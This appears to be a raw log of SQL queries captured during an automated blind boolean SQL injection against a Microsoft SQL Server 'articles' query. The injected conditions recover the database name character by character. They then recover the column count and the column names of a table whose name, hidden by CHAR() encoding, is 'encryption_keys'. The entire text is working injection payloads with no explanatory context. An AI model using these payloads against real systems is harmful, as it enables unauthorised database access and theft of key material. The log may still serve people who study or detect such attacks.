+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1))>112	211
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1))>104	211
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1))>100	211
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1))>98	210
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1))>97	210
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),3,1))>96	210
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),3,1))>112	211
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),3,1))>120	211
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),3,1))>116	211
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),3,1))>114	211
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),3,1))>115	211
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),4,1))>96	210
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),4,1))>112	211
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),4,1))>120	211
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),4,1))>116	211
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),4,1))>114	211
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),4,1))>115	211
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),5,1))>96	210
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),5,1))>112	211
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),5,1))>104	211
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),5,1))>100	211
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),5,1))>102	211
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),5,1))>101	211
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),6,1))>96	210
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),6,1))>112	211
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),6,1))>120	211
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),6,1))>116	211
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),6,1))>114	211
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),6,1))>113	211
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),7,1))>96	210
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),7,1))>48	210
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),7,1))>1	209
+	138
+	66
+use [master]	86
+	165
+	66
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(name))) AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns WHERE id=(SELECT id FROM master..sysobjects WHERE name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115))),1,1))>51	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(name))) AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns WHERE id=(SELECT id FROM master..sysobjects WHERE name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115))),1,1))>48	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(name))) AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns WHERE id=(SELECT id FROM master..sysobjects WHERE name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115))),1,1))>49	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(name))) AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns WHERE id=(SELECT id FROM master..sysobjects WHERE name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115))),1,1))>50	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(name))) AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns WHERE id=(SELECT id FROM master..sysobjects WHERE name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115))),2,1))>51	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(name))) AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns WHERE id=(SELECT id FROM master..sysobjects WHERE name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115))),2,1))>48	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(name))) AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns WHERE id=(SELECT id FROM master..sysobjects WHERE name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115))),2,1))>9	451
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 0 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),1,1))>64	916
+	66
+	200
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 0 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),1,1))>96	916
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 0 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),1,1))>112	917
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 0 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),1,1))>104	917
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 0 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),1,1))>108	917
+	66
+	138
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 0 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),1,1))>106	917
+	66
+	200
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 0 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),1,1))>107	917
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 0 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),2,1))>96	916
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 0 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),2,1))>112	917
+	66
+	138
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 0 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),2,1))>104	917
+	66
+	138
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 0 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),2,1))>100	917
+	66
+	200
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 0 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),2,1))>102	917
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 0 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),2,1))>101	917
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 0 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),3,1))>96	916
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 0 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),3,1))>112	917
+	66
+	200
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 0 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),3,1))>120	917
+	66
+	200
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 0 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),3,1))>124	917
+	66
+	138
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 0 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),3,1))>122	917
+	138
+use [master]	86
+	165
